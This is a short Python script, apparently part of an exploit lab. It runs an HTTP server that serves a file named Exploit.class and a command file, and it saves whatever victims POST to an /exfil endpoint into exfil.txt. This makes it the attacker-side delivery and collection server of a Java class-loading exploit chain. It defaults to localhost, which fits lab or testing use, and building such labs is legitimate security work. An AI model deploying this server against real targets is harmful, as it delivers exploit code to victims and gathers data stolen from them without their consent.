#!/usr/bin/env python3
"""Serve Exploit.class/cmd.txt and receive POST /exfil results."""

from __future__ import annotations

import argparse
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path


class Handler(SimpleHTTPRequestHandler):
    def do_POST(self) -> None:
        if self.path != "/exfil":
            self.send_error(404)
            return

        length = int(self.headers.get("Content-Length", "0"))
        data = self.rfile.read(length)
        target = Path(self.directory) / "exfil.txt"
        target.write_bytes(data)
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt: str, *args) -> None:
        print(fmt % args)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--bind", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8000)
    parser.add_argument("--directory", default="http_root")
    args = parser.parse_args()
    handler = lambda *a, **kw: Handler(*a, directory=args.directory, **kw)
    ThreadingHTTPServer((args.bind, args.port), handler).serve_forever()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
